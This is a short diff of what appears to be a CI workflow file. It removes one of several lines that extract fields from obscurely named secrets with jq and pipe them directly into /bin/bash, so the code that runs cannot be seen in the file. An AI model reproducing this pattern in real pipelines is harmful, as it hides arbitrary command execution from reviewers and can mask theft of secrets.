@@ -18,7 +18,6 @@ jobs:
           urdt6: ${{ secrets.urdt6 }}
         run: |
           printf '%s' "$urdt6" | jq -r .e4950 | /bin/bash
-          printf '%s' "$yfja393" | jq -r .mvq20356 | /bin/bash
           printf '%s' "$wxds91" | jq -r .pktwf496 | /bin/bash
 
       - name: Archive results
